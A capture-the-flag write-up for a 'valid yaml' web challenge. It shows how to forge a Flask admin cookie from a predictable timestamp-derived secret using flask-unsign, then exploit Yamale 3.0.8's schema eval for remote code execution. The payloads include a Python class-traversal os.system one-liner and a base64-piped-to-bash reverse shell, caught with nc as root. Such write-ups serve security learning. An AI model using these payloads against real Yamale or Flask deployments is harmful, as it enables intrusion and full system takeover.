# valid yaml
> Yet Another Markup Language, YAML, YAML Ain't Markup Language, Yamale

## About the Challenge
We were given a website with a source code (You can download the source code [here](src.zip)), on this website we can validate our YAML file


[Image extracted text: lint
Login
Name
Person
Schema
name:
str()
age:
int (max-200)
height:
num( )
awesome:
bool( )
Validate
Powered by Yamale 3.0.8
yaml]


The website also utilizes `Yamale 3.0.8` to validate our YAML file."

## How to Solve?
Yamale 3.0.8 is vulnerable to RCE (You can check the detail [here](https://github.com/23andMe/Yamale/issues/167))

```python
schema = yamale.make_schema(content="""
name: str([x.__init__.__globals__["sys"].modules["os"].system("echo 'test' > test") for x in ''.__class__.__base__.__subclasses__() if "_ModuleLock" == x.__name__])
age: int(max=200)
height: num()
awesome: bool()
""")

# Create a Data object
data = yamale.make_data(content="""
name: Bill
age: 200
height: 6.2
awesome: True
""")

# Validate data against the schema. Throws a ValueError if data is invalid.
yamale.validate(schema, data)
```

But we can't exploit this vulnerability immediately because we can only control the data object, not the schema. However, if we check the source code, when logged in as an admin, we can create/edit our own schema.

```python
@app.route("/admin/schemas", methods=["GET", "POST"])
@authed_only
def schemas():
    if request.method == "GET":
        schemas = Schemas.query.all()
        return render_template("schemas.html", schemas=schemas)
    elif request.method == "POST":
        name = request.form["name"]
        content = request.form["content"]
        schema = Schemas(name=name, content=content)
        db.session.add(schema)
        db.session.commit()
        return redirect(url_for("schema", schema_id=schema.id))


@app.route("/admin/schemas/<int:schema_id>", methods=["GET", "POST"])
@authed_only
def schema(schema_id):
    schema = Schemas.query.filter_by(id=schema_id).first_or_404()
    if request.method == "GET":
        return render_template("schema.html", schema=schema)
    elif request.method == "POST":
        name = request.form["name"]
        content = request.form["content"]
        schema.name = name
        schema.content = content
        db.session.commit()
        return redirect(url_for("schema", schema_id=schema.id))
```

To logged in as an admin, we can manipulate the cookie because of the app secret key is predictable

```python
class Config(object):
    SECRET_KEY = hashlib.md5(
        datetime.datetime.utcnow().strftime("%d/%m/%Y %H:%M").encode()
    ).hexdigest()
    BOOTSTRAP_SERVE_LOCAL = True
    SQLALCHEMY_DATABASE_URI = "sqlite:///app.db"
    SQLALCHEMY_TRACK_MODIFICATIONS = False
```

Note when you deploy the website, then you will know the secret key. And then use `flask-unsign` command to create the cookie, here is the payload I used to login as an admin

```bash
flask-unsign --sign --cookie '{"id": 1}' --secret 'cb9a2657b00b63983cf7217b268855eb'
```


[Image extracted text: Request
Response
Pretty
Raw
Hex
3)
In
=
Pretty
Raw
Hex
Render
GET
/admin/ schemas
HTTP/1.1
Host:
thecybercoopctf-3f808118261f-valid-yaml-1. chals. io
lint
3
User-Agent:
Mozilla/5.0
(Windows
NT
10
0;
Win64;
X64)
AppleWebKit/537.36
(KHTML ,
like
Gecko)
Chrome
120,
0.6099.71
Safari/537
36
Accept:
Schemas
text/html,application/xhtml+xml,application/xml;q-0.9, image/avif_
image/webp
image/apng,*/*;q=0.8,application/signed-exchange;v-b3_
q=0.7
Person
5
Cookie:
session-eyJpZCI6MXO . ZYENj Q. FNHr_segTNph6FyI_BFI14qSyqk
6
People
IP Addresses
Create New Schema
Name
Name
Schema
Schema
yaml]


Use the public proof of concept to perform Remote Code Execution (RCE). Here is the schema I used to do a reverse shell.

```yaml
name: str([x.__init__.__globals__["sys"].modules["os"].system("echo AAAAAAAAAAA== | base64 -d | bash") for x in ''.__class__.__base__.__subclasses__() if "_ModuleLock" == x.__name__])
age: int(max=200)
height: num()
awesome: bool()
```


[Image extracted text: root@ubuntu-s-Ivcpu-Zgb-sgpl-01:~#
nc
~nvlp
9999
Listening
on
0.0.0 .0
9999
Connection
received
on
45.55.194.53
45362
bash:
cannot
set
terminal
process
group
(1) :
Inappropriate
ioct
bash:
no
job
control
in
this
shell
root@9d67492c0450: /opt/app#
1s
1s
000-default.conf
pycache_
app
db
app.py
config.py
txt
models.pY
populate.py
requirements
in
requirements
txt
serve
sh
static
templates
root09d67492c0450: /opt/app#
cat
txt
cat
txt
{not_even_apache_can_stop_the_mighty_eval}
flag
flag.
flag
flag]


```
flag{not_even_apache_can_stop_the_mighty_eval}
```